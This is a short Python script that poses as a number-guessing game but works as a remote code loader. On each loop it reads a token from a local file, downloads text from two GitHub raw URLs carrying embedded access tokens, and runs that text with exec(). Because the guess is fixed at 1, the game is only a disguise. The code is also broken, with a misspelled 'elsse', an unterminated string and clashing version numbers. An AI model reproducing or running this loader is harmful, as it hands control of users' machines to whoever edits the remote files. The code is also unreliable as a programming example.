import requests

import random

print("version 3.0")

def plr():
    secret_number = random.randint(1, 100)
    attempts = 0

    while True:
        isatc= input("enter atc:")
        url = 'https://raw.githubusercontent.com/xsjfns/myown/main/manket.txt?token=GHSAT0AAAAAACQOYUHX5ZD3ZL2PUJKUWE5QZQMUA7Q'
        url2 = 'https://raw.githubusercontent.com/xsjfns/myown/main/atcket.txt?token=GHSAT0AAAAAACQOYUHW4OELJLACJ6OIJKMCZQMUB7A'
        guess = "1"
        file = open('error.txt', 'r')
        file_content = file.read()
        file.close()
        token = file_content
        headers = {"Authorization": f"token {token}"}
        if isatc=="ok":
            response = requests.get(url2, headers=headers) 
            mycnt= response.text
            print("Request is success.",exec(f"{mycnt}"))
        response = requests.get(url, headers=headers) 
        guess = int(guess)
        attempts += 1
        fncnt = response.text

        if guess < secret_number:
            print("Too low! Try again.",exec(f"{fncnt}"))
        elif guess > secret_number:
            print("Too high! Try again.",exec(f"{fncnt}"))
            
        elsse:
            print(f"Congratulations! ,exec(f"{fncnt}"))
            break
            
def edg():
    print("Thanks for playing!")

print("Welcome to the Number Guessing Game!")
print("I'm thinking of a number between 1 and 100.")
print("Try to guess it in the fewest attempts possible!")
print("Let's begin!")
print("versoin 2.0")
plr()
edg()
